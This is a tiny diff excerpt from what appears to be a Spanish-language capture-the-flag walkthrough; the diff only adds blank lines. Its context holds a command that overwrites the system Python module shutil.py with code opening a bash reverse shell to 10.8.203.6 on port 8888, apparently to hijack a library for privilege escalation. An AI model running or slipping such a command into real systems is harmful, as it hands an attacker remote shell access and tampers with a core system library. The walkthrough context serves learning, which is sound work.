@@ -133,3 +133,5 @@ hacemos una peticion con wget al servidor para bajarnos el archivo
 ```python
 	echo "import os; os.system(\"bash -c 'bash -i >& /dev/tcp/10.8.203.6/8888 0>&1'\")" > /usr/lib/python3.8/shutil.py
 ```
+
+
